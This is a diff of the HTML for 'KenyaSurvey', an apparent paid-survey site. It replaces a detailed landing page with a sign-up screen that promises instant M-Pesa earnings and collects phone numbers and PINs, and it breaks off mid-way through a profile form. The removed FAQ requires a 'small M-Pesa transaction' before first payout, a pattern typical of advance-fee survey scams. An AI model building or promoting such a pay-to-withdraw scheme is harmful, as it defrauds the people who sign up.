@@ -3,702 +3,179 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>KenyaSurvey – Research Participation Platform</title>
-<meta name="description" content="KenyaSurvey connects eligible Kenyan participants with academic, market research and public opinion studies. Join thousands of verified participants today." />
+<title>KenyaSurvey - Earn While You Learn</title>
 <link rel="preconnect" href="https://fonts.googleapis.com" />
-<link rel="stylesheet" href="app.css" />
+<link rel="stylesheet" href="app.css">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
 <link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
 </head>
 <body>
 
-<!-- TOAST -->
+<!-- TOAST CONTAINER -->
 <div class="toast-container" id="toast-container"></div>
 <div class="earn-pop" id="earn-pop">
   <div class="earn-amount" id="earn-amount">+KSh 0</div>
-  <div class="earn-label">Compensation Added!</div>
+  <div class="earn-label">Earned!</div>
 </div>
 
-<!-- ══════════════════════════════════════════
-     LANDING SCREEN
-══════════════════════════════════════════ -->
-<div class="screen active" id="landing-screen">
-
-  <!-- NAV -->
-  <nav class="lp-nav" id="lp-nav">
-    <div class="lp-nav-inner">
-      <div class="lp-logo" onclick="lpScrollTop()">
-        <div class="lp-logo-icon"><i class="fas fa-graduation-cap"></i></div>
-        <span class="lp-logo-text">Kenya<strong>Survey</strong></span>
-      </div>
-
-      <ul class="lp-nav-links">
-        <li><a href="#lp-about" onclick="lpScrollTo('lp-about')">About Us</a></li>
-        <li><a href="#lp-how" onclick="lpScrollTo('lp-how')">How It Works</a></li>
-        <li><a href="#lp-research" onclick="lpScrollTo('lp-research')">Research Areas</a></li>
-        <li><a href="#lp-faq" onclick="lpScrollTo('lp-faq')">FAQ</a></li>
-        <li><a href="#lp-contact" onclick="lpScrollTo('lp-contact')">Contact</a></li>
-      </ul>
-
-      <div class="lp-nav-cta">
-        <button class="lp-btn-ghost" onclick="goToAuth('login')">Sign In</button>
-        <button class="lp-btn-solid" onclick="goToAuth('register')">Become a Participant</button>
-      </div>
-
-      <button class="lp-hamburger" id="lp-hamburger" onclick="toggleLpMenu()">
-        <i class="fas fa-bars"></i>
-      </button>
+<!-- ════════════════ AUTH SCREEN ════════════════ -->
+<div class="screen active" id="auth-screen">
+  <div class="auth-box">
+    <div class="logo-wrap">
+      <div class="logo-icon"><i class="fas fa-graduation-cap"></i></div>
+      <div class="logo-title">Kenya<span>Survey</span></div>
+      <div class="logo-sub">Earn money answering Kenyan questions</div>
     </div>
 
-    <!-- Mobile menu -->
-    <div class="lp-mobile-menu" id="lp-mobile-menu">
-      <a href="#lp-about"    onclick="lpScrollTo('lp-about');closeLpMenu()">About Us</a>
-      <a href="#lp-how"      onclick="lpScrollTo('lp-how');closeLpMenu()">How It Works</a>
-      <a href="#lp-research" onclick="lpScrollTo('lp-research');closeLpMenu()">Research Areas</a>
-      <a href="#lp-faq"      onclick="lpScrollTo('lp-faq');closeLpMenu()">FAQ</a>
-      <a href="#lp-contact"  onclick="lpScrollTo('lp-contact');closeLpMenu()">Contact</a>
-      <div class="lp-mobile-cta">
-        <button class="lp-btn-ghost"  onclick="goToAuth('login');closeLpMenu()">Sign In</button>
-        <button class="lp-btn-solid"  onclick="goToAuth('register');closeLpMenu()">Become a Participant</button>
-      </div>
-    </div>
-  </nav>
-
-  <!-- HERO -->
-  <section class="lp-hero">
-    <div class="lp-hero-inner">
-      <div class="lp-hero-badge">
-        <i class="fas fa-shield-alt"></i> Verified Research Platform · Kenya
-      </div>
-
-      <h1 class="lp-hero-title">
-        Research That Connects<br>
-        <span class="lp-hero-accent">Kenya's Voices</span>
-      </h1>
-
-      <p class="lp-hero-desc">
-        KenyaSurvey connects eligible Kenyan participants with academic, market research
-        and public opinion studies. Participants who qualify may receive compensation
-        based on project requirements.
-      </p>
-
-      <!-- Shown to logged-out visitors -->
-      <div class="lp-hero-actions" id="lp-hero-cta-guest">
-        <button class="lp-btn-solid lp-btn-lg" onclick="goToAuth('register')">
-          <i class="fas fa-user-plus"></i> Become a Participant
-        </button>
-        <button class="lp-btn-outline lp-btn-lg" onclick="lpScrollTo('lp-how')">
-          <i class="fas fa-play-circle"></i> How It Works
-        </button>
-      </div>
-
-      <!-- Shown to logged-in users — hidden by default -->
-      <div class="lp-hero-actions hidden" id="lp-hero-cta-user">
-        <button class="lp-btn-solid lp-btn-lg" onclick="showScreen('app-screen')">
-          <i class="fas fa-clipboard-list"></i> Start Participating
-        </button>
-      </div>
-
-      <div class="lp-hero-trust">
-        <span><i class="fas fa-lock"></i> HTTPS Encrypted</span>
-        <span><i class="fas fa-user-shield"></i> Privacy Protected</span>
-        <span><i class="fas fa-check-circle"></i> Verified Participants</span>
-      </div>
+    <div class="auth-tabs">
+      <button class="auth-tab active" id="tab-register" onclick="switchTab('register')">Create Account</button>
+      <button class="auth-tab" id="tab-login" onclick="switchTab('login')">Sign In</button>
     </div>
 
-    <div class="lp-hero-visual">
-      <div class="lp-hero-card">
-        <div class="lp-card-row">
-          <div class="lp-card-icon green"><i class="fas fa-clipboard-list"></i></div>
-          <div>
-            <div class="lp-card-label">Active Research Projects</div>
-            <div class="lp-card-val">120+ Surveys</div>
-          </div>
-        </div>
-        <div class="lp-card-row">
-          <div class="lp-card-icon blue"><i class="fas fa-users"></i></div>
-          <div>
-            <div class="lp-card-label">Verified Participants</div>
-            <div class="lp-card-val">Across 47 Counties</div>
-          </div>
-        </div>
-        <div class="lp-card-row">
-          <div class="lp-card-icon gold"><i class="fas fa-chart-bar"></i></div>
-          <div>
-            <div class="lp-card-label">Research Categories</div>
-            <div class="lp-card-val">Consumer · Health · Education</div>
-          </div>
-        </div>
-        <div class="lp-card-divider"></div>
-        <div class="lp-card-disclaimer">
-          <i class="fas fa-info-circle"></i>
-          Compensation varies by project. Survey eligibility is not guaranteed.
+    <!-- REGISTER FORM -->
+    <div class="auth-form" id="form-register">
+      <div class="bonus-badge">
+        <i class="fas fa-gift"></i>
+        Get KSh 50 instantly after completing your profile
+      </div>
+      <div class="field-group">
+        <label class="field-label">Phone Number</label>
+        <div class="field-wrap">
+          <i class="fas fa-phone"></i>
+          <input class="field-input" type="tel" id="reg-phone" placeholder="07XX XXX XXX" maxlength="12" />
         </div>
       </div>
-    </div>
-  </section>
-
-  <!-- RESEARCH AREAS -->
-  <section class="lp-section" id="lp-research">
-    <div class="lp-section-inner">
-      <div class="lp-eyebrow"><i class="fas fa-chart-bar"></i> Research Areas</div>
-      <h2 class="lp-section-title">Research Projects May Include</h2>
-      <p class="lp-section-sub">
-        Organisations across multiple sectors rely on KenyaSurvey to reach verified
-        Kenyan participants for data collection and research studies.
-      </p>
-      <div class="lp-grid-3">
-        <div class="lp-card-block">
-          <div class="lp-block-icon"><i class="fas fa-shopping-bag"></i></div>
-          <h3>Consumer Products</h3>
-          <p>Product feedback, brand perception, and consumer behaviour studies for manufacturers and retailers.</p>
-        </div>
-        <div class="lp-card-block">
-          <div class="lp-block-icon"><i class="fas fa-heartbeat"></i></div>
-          <h3>Healthcare Research</h3>
-          <p>Public health surveys, patient experience studies, and health awareness campaigns.</p>
-        </div>
-        <div class="lp-card-block">
-          <div class="lp-block-icon"><i class="fas fa-graduation-cap"></i></div>
-          <h3>Education Studies</h3>
-          <p>Academic research, student experience surveys, and educational policy evaluation projects.</p>
-        </div>
-        <div class="lp-card-block">
-          <div class="lp-block-icon"><i class="fas fa-mobile-alt"></i></div>
-          <h3>Technology Research</h3>
-          <p>App usability, digital adoption, and technology access studies for tech companies and NGOs.</p>
-        </div>
-        <div class="lp-card-block">
-          <div class="lp-block-icon"><i class="fas fa-comments"></i></div>
-          <h3>Public Opinion</h3>
-          <p>Community sentiment, policy awareness, and social research for government bodies and think-tanks.</p>
-        </div>
-        <div class="lp-card-block">
-          <div class="lp-block-icon"><i class="fas fa-hands-helping"></i></div>
-          <h3>NGO Research</h3>
-          <p>Impact assessments, field surveys, and beneficiary feedback for non-governmental organisations.</p>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- ABOUT -->
-  <section class="lp-section lp-section-alt" id="lp-about">
-    <div class="lp-section-inner lp-about-grid">
-      <div class="lp-about-text">
-        <div class="lp-eyebrow"><i class="fas fa-info-circle"></i> About KenyaSurvey</div>
-        <h2 class="lp-section-title">We Connect Organisations with Verified Kenyan Participants</h2>
-        <p>KenyaSurvey is a research participation platform that bridges the gap between organisations seeking reliable data and Kenyan citizens willing to share their perspectives. We handle participant recruitment, verification, and compensation so researchers can focus on what matters — the data.</p>
-        <p>Demographic profiling is a core part of our platform. Research projects often require specific participant profiles — particular counties, age groups, or occupations. By collecting verified demographic data, we ensure your survey reaches the right audience.</p>
-        <div class="lp-about-stats">
-          <div class="lp-about-stat">
-            <div class="lp-stat-val">47</div>
-            <div class="lp-stat-label">Counties Covered</div>
-          </div>
-          <div class="lp-about-stat">
-            <div class="lp-stat-val">6+</div>
-            <div class="lp-stat-label">Research Categories</div>
-          </div>
-          <div class="lp-about-stat">
-            <div class="lp-stat-val">M-Pesa</div>
-            <div class="lp-stat-label">Compensation Method</div>
-          </div>
-        </div>
-      </div>
-      <div class="lp-about-cards">
-        <div class="lp-about-card">
-          <i class="fas fa-bullseye"></i>
-          <div>
-            <h4>Our Mission</h4>
-            <p>To make research participation accessible to all Kenyans while ensuring organisations receive accurate, demographically representative data.</p>
-          </div>
-        </div>
-        <div class="lp-about-card">
-          <i class="fas fa-eye"></i>
-          <div>
-            <h4>Our Vision</h4>
-            <p>A Kenya where every citizen can contribute meaningfully to research that shapes policy, business and community outcomes.</p>
-          </div>
-        </div>
-        <div class="lp-about-card">
-          <i class="fas fa-balance-scale"></i>
-          <div>
-            <h4>Research Ethics</h4>
-            <p>All participant data is handled confidentially. Survey responses are aggregated and anonymised before being shared with research clients.</p>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- HOW IT WORKS -->
-  <section class="lp-section" id="lp-how">
-    <div class="lp-section-inner">
-      <div class="lp-eyebrow"><i class="fas fa-list-ol"></i> Process</div>
-      <h2 class="lp-section-title">How It Works</h2>
-      <p class="lp-section-sub">Joining KenyaSurvey is straightforward. From registration to compensation, here is what the process looks like.</p>
-      <div class="lp-steps">
-        <div class="lp-step">
-          <div class="lp-step-num">1</div>
-          <div class="lp-step-body">
-            <h3>Create a Participant Account</h3>
-            <p>Register with your Kenyan mobile number and set a secure PIN. Your phone number is used for identity verification and M-Pesa compensation.</p>
-          </div>
-        </div>
-        <div class="lp-step-line"></div>
-        <div class="lp-step">
-          <div class="lp-step-num">2</div>
-          <div class="lp-step-body">
-            <h3>Complete Your Participant Profile</h3>
-            <p>Provide your demographic information — county, occupation, and education level. This helps us match you with research projects relevant to your profile.</p>
-          </div>
-        </div>
-        <div class="lp-step-line"></div>
-        <div class="lp-step">
-          <div class="lp-step-num">3</div>
-          <div class="lp-step-body">
-            <h3>Participate in Available Research Surveys</h3>
-            <p>Access surveys relevant to your demographic profile. Answer all questions honestly — research quality depends on accurate responses.</p>
-          </div>
-        </div>
-        <div class="lp-step-line"></div>
-        <div class="lp-step">
-          <div class="lp-step-num">4</div>
-          <div class="lp-step-body">
-            <h3>Compensation is Calculated Per Eligible Response</h3>
-            <p>Compensation varies by project, survey length and eligibility. Not all surveys pay the same amount, and eligibility is determined by project requirements.</p>
-          </div>
-        </div>
-        <div class="lp-step-line"></div>
-        <div class="lp-step">
-          <div class="lp-step-num">5</div>
-          <div class="lp-step-body">
-            <h3>Complete Account Verification</h3>
-            <p>Before your first payment, a one-time account verification process confirms your registered mobile number and activates M-Pesa payout services.</p>
-          </div>
-        </div>
-        <div class="lp-step-line"></div>
-        <div class="lp-step">
-          <div class="lp-step-num">6</div>
-          <div class="lp-step-body">
-            <h3>Submit a Payment Request</h3>
-            <p>Once verified, submit payment requests to your registered M-Pesa number. Processing may take up to 24 hours.</p>
-          </div>
-        </div>
-      </div>
-      <div class="lp-info-note">
-        <i class="fas fa-info-circle"></i>
-        <div>
-          <strong>About Compensation</strong>
-          <p>Compensation varies depending on the project, survey length and your eligibility. KenyaSurvey does not guarantee a specific income. Payments are processed via M-Pesa after account verification is complete.</p>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <!-- TRUST -->
-  <section class="lp-section lp-section-alt">
-    <div class="lp-section-inner">
-      <div class="lp-eyebrow"><i class="fas fa-shield-alt"></i> Trust &amp; Security</div>
-      <h2 class="lp-section-title">Built for Participant Trust</h2>
-      <p class="lp-section-sub">Your data and privacy are central to how we operate.</p>
-      <div class="lp-grid-3">
-        <div class="lp-trust-item">
+      <div class="field-group">
+        <label class="field-label">Create 4-Digit PIN</label>
+        <div class="field-wrap">
           <i class="fas fa-lock"></i>
-          <h4>Secure Platform</h4>
-          <p>All connections use HTTPS encryption. PINs are hashed and never stored in plain text.</p>
-        </div>
-        <div class="lp-trust-item">
-          <i class="fas fa-user-shield"></i>
-          <h4>Privacy Protected</h4>
-          <p>Your personal data is never sold to third parties. Responses are shared in aggregate, anonymised form only.</p>
-        </div>
-        <div class="lp-trust-item">
-          <i class="fas fa-database"></i>
-          <h4>Data Confidentiality</h4>
-          <p>Individual survey responses are kept confidential. Research clients receive aggregated datasets, not personal records.</p>
-        </div>
-        <div class="lp-trust-item">
-          <i class="fas fa-id-badge"></i>
-          <h4>Verified Participants</h4>
-          <p>Mobile number verification ensures research data comes from real, registered Kenyan participants.</p>
-        </div>
-        <div class="lp-trust-item">
-          <i class="fas fa-balance-scale"></i>
-          <h4>Research Ethics</h4>
-          <p>We follow ethical data collection principles. Participants may request account and data deletion at any time.</p>
-        </div>
-        <div class="lp-trust-item">
-          <i class="fas fa-mobile-alt"></i>
-          <h4>M-Pesa Integration</h4>
-          <p>Compensation is paid directly to your Safaricom M-Pesa number. We do not handle or store your M-Pesa PIN.</p>
+          <input class="field-input" type="password" id="reg-pin" placeholder="Enter 4-digit PIN" maxlength="4" inputmode="numeric" />
         </div>
       </div>
-    </div>
-  </section>
-
-  <!-- FAQ -->
-  <section class="lp-section" id="lp-faq">
-    <div class="lp-section-inner lp-faq-wrap">
-      <div class="lp-eyebrow"><i class="fas fa-question-circle"></i> FAQ</div>
-      <h2 class="lp-section-title">Frequently Asked Questions</h2>
-      <div class="lp-faq-list">
-        <div class="lp-faq-item">
-          <button class="lp-faq-q" onclick="toggleFaq(this)">
-            Who can join KenyaSurvey? <i class="fas fa-chevron-down"></i>
-          </button>
-          <div class="lp-faq-a">
-            <p>Any Kenyan resident aged 18 or older with a valid Safaricom mobile number can register. You must provide accurate demographic information to be matched with relevant research projects.</p>
-          </div>
-        </div>
-        <div class="lp-faq-item">
-          <button class="lp-faq-q" onclick="toggleFaq(this)">
-            How do I qualify for a survey? <i class="fas fa-chevron-down"></i>
-          </button>
-          <div class="lp-faq-a">
-            <p>Survey eligibility is determined by the project's demographic requirements — such as county, occupation, age group or education level. Not all participants will qualify for all surveys. Your profile information determines which surveys you are matched to.</p>
-          </div>
-        </div>
-        <div class="lp-faq-item">
-          <button class="lp-faq-q" onclick="toggleFaq(this)">
-            Do all surveys pay? <i class="fas fa-chevron-down"></i>
-          </button>
-          <div class="lp-faq-a">
-            <p>Compensation is awarded per eligible response based on project requirements. Not all surveys offer the same compensation, and some surveys may only compensate participants who meet specific eligibility criteria. KenyaSurvey does not guarantee a specific income.</p>
-          </div>
-        </div>
-        <div class="lp-faq-item">
-          <button class="lp-faq-q" onclick="toggleFaq(this)">
-            How is compensation calculated? <i class="fas fa-chevron-down"></i>
-          </button>
-          <div class="lp-faq-a">
-            <p>Compensation amounts are set per individual research project. Factors that influence compensation include survey length, topic complexity, and your eligibility for the project. Compensation rates are displayed on each survey before you begin.</p>
-          </div>
-        </div>
-        <div class="lp-faq-item">
-          <button class="lp-faq-q" onclick="toggleFaq(this)">
-            How long do payments take? <i class="fas fa-chevron-down"></i>
-          </button>
-          <div class="lp-faq-a">
-            <p>Payment requests are processed to your M-Pesa number within 24 hours of submission. Before your first payment, you must complete a one-time account verification to confirm your registered mobile number and activate payout services.</p>
-          </div>
-        </div>
-        <div class="lp-faq-item">
-          <button class="lp-faq-q" onclick="toggleFaq(this)">
-            Can I be rejected from surveys? <i class="fas fa-chevron-down"></i>
-          </button>
-          <div class="lp-faq-a">
-            <p>Yes. Survey eligibility depends on whether your demographic profile matches the project's requirements. If you do not qualify, you will not be able to participate in that particular survey. More surveys across different categories are added regularly.</p>
-          </div>
-        </div>
-        <div class="lp-faq-item">
-          <button class="lp-faq-q" onclick="toggleFaq(this)">
-            Is my data kept private? <i class="fas fa-chevron-down"></i>
-          </button>
-          <div class="lp-faq-a">
-            <p>Yes. Your personal information is never sold to third parties. Survey responses are shared with research clients in aggregate, anonymised form only. You may request deletion of your account and data by contacting support.</p>
-          </div>
-        </div>
-        <div class="lp-faq-item">
-          <button class="lp-faq-q" onclick="toggleFaq(this)">
-            What is the account verification process? <i class="fas fa-chevron-down"></i>
-          </button>
-          <div class="lp-faq-a">
-            <p>Before your first payment request, you must complete a one-time account verification. This confirms your registered M-Pesa number and activates payment services on your account. Verification involves a small M-Pesa transaction to confirm your mobile number ownership. This step is required once only.</p>
-          </div>
+      <div class="field-group">
+        <label class="field-label">Confirm PIN</label>
+        <div class="field-wrap">
+          <i class="fas fa-lock"></i>
+          <input class="field-input" type="password" id="reg-pin2" placeholder="Repeat your PIN" maxlength="4" inputmode="numeric" />
         </div>
       </div>
-    </div>
-  </section>
-
-  <!-- CTA BANNER -->
-  <section class="lp-cta-section">
-    <div class="lp-cta-inner">
-      <h2>Ready to Participate in Research?</h2>
-      <p>Join verified Kenyan participants contributing to academic, market and public opinion research. Create your free account today.</p>
-      <button class="lp-btn-solid lp-btn-lg" onclick="goToAuth('register')">
-        <i class="fas fa-user-plus"></i> Create Free Account
+      <div class="alert error" id="reg-error"></div>
+      <button class="btn-primary" id="btn-register" onclick="doRegister()">
+        <i class="fas fa-user-plus"></i> Create Account
       </button>
-      <p class="lp-cta-note">By registering you confirm you are 18+ and a Kenyan resident. Survey eligibility is not guaranteed.</p>
+      <p class="auth-note">By registering, you agree to participate in surveys and earn real money via M-Pesa.</p>
     </div>
-  </section>
 
-  <!-- CONTACT -->
-  <section class="lp-section lp-section-alt" id="lp-contact">
-    <div class="lp-section-inner lp-contact-grid">
-      <div>
-        <div class="lp-eyebrow"><i class="fas fa-envelope"></i> Contact</div>
-        <h2 class="lp-section-title">Get in Touch</h2>
-        <p class="lp-contact-intro">For support, account issues, or general enquiries, reach out to our team. We aim to respond within 24–48 hours.</p>
-        <div class="lp-contact-details">
-          <div class="lp-contact-row">
-            <span class="lp-contact-icon"><i class="fas fa-envelope"></i></span>
-            <div>
-              <div class="lp-contact-label">Support Email</div>
-              <div class="lp-contact-val">support@kenyasurvey.com</div>
-            </div>
-          </div>
-          <div class="lp-contact-row">
-            <span class="lp-contact-icon"><i class="fas fa-globe"></i></span>
-            <div>
-              <div class="lp-contact-label">Platform</div>
-              <div class="lp-contact-val">premium-surveys-kenya.vercel.app</div>
-            </div>
-          </div>
-          <div class="lp-contact-row">
-            <span class="lp-contact-icon"><i class="fas fa-clock"></i></span>
-            <div>
-              <div class="lp-contact-label">Response Time</div>
-              <div class="lp-contact-val">Within 24–48 business hours</div>
-            </div>
-          </div>
+    <!-- LOGIN FORM -->
+    <div class="auth-form hidden" id="form-login">
+      <div class="field-group">
+        <label class="field-label">Phone Number</label>
+        <div class="field-wrap">
+          <i class="fas fa-phone"></i>
+          <input class="field-input" type="tel" id="login-phone" placeholder="07XX XXX XXX" maxlength="12" />
         </div>
       </div>
-      <div class="lp-contact-topics">
-        <h4><i class="fas fa-list-ul"></i> Common Support Topics</h4>
-        <ul>
-          <li><i class="fas fa-chevron-right"></i> Account verification issues</li>
-          <li><i class="fas fa-chevron-right"></i> Payment request status</li>
-          <li><i class="fas fa-chevron-right"></i> Survey eligibility questions</li>
-          <li><i class="fas fa-chevron-right"></i> Profile update requests</li>
-          <li><i class="fas fa-chevron-right"></i> Account deletion requests</li>
-          <li><i class="fas fa-chevron-right"></i> Data privacy enquiries</li>
-        </ul>
-      </div>
-    </div>
-  </section>
-
-  <!-- FOOTER -->
-  <footer class="lp-footer">
-    <div class="lp-footer-inner">
-      <div class="lp-footer-brand">
-        <div class="lp-footer-logo">
-          <div class="lp-logo-icon small"><i class="fas fa-graduation-cap"></i></div>
-          <span>Kenya<strong>Survey</strong></span>
+      <div class="field-group">
+        <label class="field-label">Your 4-Digit PIN</label>
+        <div class="field-wrap">
+          <i class="fas fa-lock"></i>
+          <input class="field-input" type="password" id="login-pin" placeholder="Enter PIN" maxlength="4" inputmode="numeric" />
         </div>
-        <p>A research participation platform connecting verified Kenyan participants with academic, market and public opinion studies.</p>
       </div>
-      <div class="lp-footer-col">
-        <h5>Company</h5>
-        <a href="#lp-about"    onclick="lpScrollTo('lp-about')">About Us</a>
-        <a href="#lp-research" onclick="lpScrollTo('lp-research')">Research Areas</a>
-        <a href="#lp-how"      onclick="lpScrollTo('lp-how')">How It Works</a>
-        <a href="#lp-contact"  onclick="lpScrollTo('lp-contact')">Contact</a>
-      </div>
-      <div class="lp-footer-col">
-        <h5>Legal</h5>
-        <a href="#" onclick="showModal('privacy');return false;">Privacy Policy</a>
-        <a href="#" onclick="showModal('terms');return false;">Terms of Service</a>
-      </div>
-      <div class="lp-footer-col">
-        <h5>Participant</h5>
-        <a href="#" onclick="goToAuth('register');return false;">Create Account</a>
-        <a href="#" onclick="goToAuth('login');return false;">Sign In</a>
-        <a href="#lp-faq" onclick="lpScrollTo('lp-faq')">FAQ</a>
-      </div>
-    </div>
-    <div class="lp-footer-bottom">
-      <span>&copy; 2025 KenyaSurvey. All rights reserved.</span>
-      <span>support@kenyasurvey.com</span>
-    </div>
-  </footer>
-
-</div><!-- /landing-screen -->
-
-
-<!-- ══════════════════════════════════════════
-     AUTH SCREEN
-══════════════════════════════════════════ -->
-<div class="screen" id="auth-screen">
-  <div class="auth-wrap">
-    <div class="auth-box">
-      <button class="auth-back-btn" onclick="goToLanding()">
-        <i class="fas fa-arrow-left"></i> Back to Home
+      <div class="alert error" id="login-error"></div>
+      <button class="btn-primary" id="btn-login" onclick="doLogin()">
+        <i class="fas fa-sign-in-alt"></i> Sign In
       </button>
-
-      <div class="logo-wrap">
-        <div class="logo-icon"><i class="fas fa-graduation-cap"></i></div>
-        <div class="logo-title">Kenya<span>Survey</span></div>
-        <div class="logo-sub">Research Participation Platform</div>
-      </div>
-
-      <div class="auth-tabs">
-        <button class="auth-tab active" id="tab-register" onclick="switchTab('register')">Create Account</button>
-        <button class="auth-tab" id="tab-login" onclick="switchTab('login')">Sign In</button>
-      </div>
-
-      <!-- REGISTER -->
-      <div class="auth-form" id="form-register">
-        <div class="auth-heading">
-          <h2>Become a KenyaSurvey Participant</h2>
-        </div>
-        <div class="auth-confirm-list">
-          <p class="confirm-label">By registering you confirm:</p>
-          <ul>
-            <li><i class="fas fa-check"></i> You are at least 18 years old</li>
-            <li><i class="fas fa-check"></i> Information provided is accurate</li>
-            <li><i class="fas fa-check"></i> Survey eligibility is not guaranteed</li>
-            <li><i class="fas fa-check"></i> Compensation depends on project completion</li>
-          </ul>
-        </div>
-        <div class="field-group">
-          <label class="field-label">Phone Number</label>
-          <div class="field-wrap">
-            <i class="fas fa-phone"></i>
-            <input class="field-input" type="tel" id="reg-phone" placeholder="07XX XXX XXX" maxlength="12" />
-          </div>
-        </div>
-        <div class="field-group">
-          <label class="field-label">Create 4-Digit PIN</label>
-          <div class="field-wrap">
-            <i class="fas fa-lock"></i>
-            <input class="field-input" type="password" id="reg-pin" placeholder="Enter 4-digit PIN" maxlength="4" inputmode="numeric" />
-          </div>
-        </div>
-        <div class="field-group">
-          <label class="field-label">Confirm PIN</label>
-          <div class="field-wrap">
-            <i class="fas fa-lock"></i>
-            <input class="field-input" type="password" id="reg-pin2" placeholder="Repeat your PIN" maxlength="4" inputmode="numeric" />
-          </div>
-        </div>
-        <div class="alert error" id="reg-error"></div>
-        <button class="btn-primary" id="btn-register" onclick="doRegister()">
-          <i class="fas fa-user-plus"></i> Create Account
-        </button>
-        <p class="auth-note">
-          By registering, you agree to our
-          <span class="text-link" onclick="showModal('terms')">Terms of Service</span> and
-          <span class="text-link" onclick="showModal('privacy')">Privacy Policy</span>.
-          Participation in surveys does not guarantee compensation.
-        </p>
-      </div>
-
-      <!-- LOGIN -->
-      <div class="auth-form hidden" id="form-login">
-        <div class="field-group">
-          <label class="field-label">Phone Number</label>
-          <div class="field-wrap">
-            <i class="fas fa-phone"></i>
-            <input class="field-input" type="tel" id="login-phone" placeholder="07XX XXX XXX" maxlength="12" />
-          </div>
-        </div>
-        <div class="field-group">
-          <label class="field-label">Your 4-Digit PIN</label>
-          <div class="field-wrap">
-            <i class="fas fa-lock"></i>
-            <input class="field-input" type="password" id="login-pin" placeholder="Enter PIN" maxlength="4" inputmode="numeric" />
-          </div>
-        </div>
-        <div class="alert error" id="login-error"></div>
-        <button class="btn-primary" id="btn-login" onclick="doLogin()">
-          <i class="fas fa-sign-in-alt"></i> Sign In
-        </button>
-      </div>
-
-      <div class="auth-footer-links">
-        <span class="text-link" onclick="showModal('about')">About Us</span>
-        <span class="auth-dot">·</span>
-        <span class="text-link" onclick="showModal('terms')">Terms</span>
-        <span class="auth-dot">·</span>
-        <span class="text-link" onclick="showModal('privacy')">Privacy</span>
-        <span class="auth-dot">·</span>
-        <span class="text-link" onclick="showModal('contact')">Contact</span>
-      </div>
     </div>
   </div>
 </div>
 
-
-<!-- ══════════════════════════════════════════
-     PROFILE SCREEN
-══════════════════════════════════════════ -->
+<!-- ════════════════ PROFILE SCREEN ════════════════ -->
 <div class="screen" id="profile-screen">
-  <div class="profile-wrap">
-    <div class="profile-box">
-      <div class="profile-header">
-        <div class="logo-icon" style="margin:0 auto 16px"><i class="fas fa-user-check"></i></div>
-        <h2>Complete Your Profile</h2>
-        <p>We use demographic information to match you with relevant research opportunities. All data is handled in accordance with our <span class="text-link" onclick="showModal('privacy')">Privacy Policy</span>.</p>
+  <div class="profile-box">
+    <div class="profile-header">
+      <div class="logo-icon" style="margin:0 auto 16px"><i class="fas fa-user-check"></i></div>
+      <h2>Complete Your Profile</h2>
+      <p>Fill in your details to unlock the full survey dashboard and earn your welcome bonus.</p>
+    </div>
+
+    <div class="auth-form">
+      <div class="field-group">
+        <label class="field-label">Full Name</label>
+        <div class="field-wrap">
+          <i class="fas fa-user"></i>
+          <input class="field-input" type="text" id="prof-name" placeholder="Enter your full name" />
+        </div>
       </div>
-      <div class="auth-form">
-        <div class="field-group">
-          <label class="field-label">Full Name</label>
-          <div class="field-wrap">
-            <i class="fas fa-user"></i>
-            <input class="field-input" type="text" id="prof-name" placeholder="Enter your full name" />
-          </div>
+      <div class="field-group">
+        <label class="field-label">County</label>
+        <div class="field-wrap">
+          <i class="fas fa-map-marker-alt"></i>
+          <select class="select-input" id="prof-county">
+            <option value="">Select your county</option>
+            <option>Mombasa</option><option>Kwale</option><option>Kilifi</option><option>Tana River</option>
+            <option>Lamu</option><option>Taita-Taveta</option><option>Garissa</option><option>Wajir</option>
+            <option>Mandera</option><option>Marsabit</option><option>Isiolo</option><option>Meru</option>
+            <option>Tharaka-Nithi</option><option>Embu</option><option>Kitui</option><option>Machakos</option>
+            <option>Makueni</option><option>Nyandarua</option><option>Nyeri</option><option>Kirinyaga</option>
+            <option>Murang'a</option><option>Kiambu</option><option>Turkana</option><option>West Pokot</option>
+            <option>Samburu</option><option>Trans-Nzoia</option><option>Uasin Gishu</option><option>Elgeyo-Marakwet</option>
+            <option>Nandi</option><option>Baringo</option><option>Laikipia</option><option>Nakuru</option>
+            <option>Narok</option><option>Kajiado</option><option>Kericho</option><option>Bomet</option>
+            <option>Kakamega</option><option>Vihiga</option><option>Bungoma</option><option>Busia</option>
+            <option>Siaya</option><option>Kisumu</option><option>Homa Bay</option><option>Migori</option>
+            <option>Kisii</option><option>Nyamira</option><option>Nairobi</option>
+          </select>
         </div>
-        <div class="field-group">
-          <label class="field-label">County</label>
-          <div class="field-wrap">
-            <i class="fas fa-map-marker-alt"></i>
-            <select class="select-input" id="prof-county">
-              <option value="">Select your county</option>
-              <option>Mombasa</option><option>Kwale</option><option>Kilifi</option><option>Tana River</option>
-              <option>Lamu</option><option>Taita-Taveta</option><option>Garissa</option><option>Wajir</option>
-              <option>Mandera</option><option>Marsabit</option><option>Isiolo</option><option>Meru</option>
-              <option>Tharaka-Nithi</option><option>Embu</option><option>Kitui</option><option>Machakos</option>
-              <option>Makueni</option><option>Nyandarua</option><option>Nyeri</option><option>Kirinyaga</option>
-              <option>Murang'a</option><option>Kiambu</option><option>Turkana</option><option>West Pokot</option>
-              <option>Samburu</option><option>Trans-Nzoia</option><option>Uasin Gishu</option><option>Elgeyo-Marakwet</option>
-              <option>Nandi</option><option>Baringo</option><option>Laikipia</option><option>Nakuru</option>
-              <option>Narok</option><option>Kajiado</option><option>Kericho</option><option>Bomet</option>
-              <option>Kakamega</option><option>Vihiga</option><option>Bungoma</option><option>Busia</option>
-              <option>Siaya</option><option>Kisumu</option><option>Homa Bay</option><option>Migori</option>
-              <option>Kisii</option><option>Nyamira</option><option>Nairobi</option>
-            </select>
-          </div>
-        </div>
-        <div class="field-group">
-          <label class="field-label">Occupation</label>
-          <div class="field-wrap">
-            <i class="fas fa-briefcase"></i>
-            <select class="select-input" id="prof-occupation">
-              <option value="">Select occupation</option>
-              <option>Student</option><option>Employed - Private Sector</option><option>Employed - Government</option>
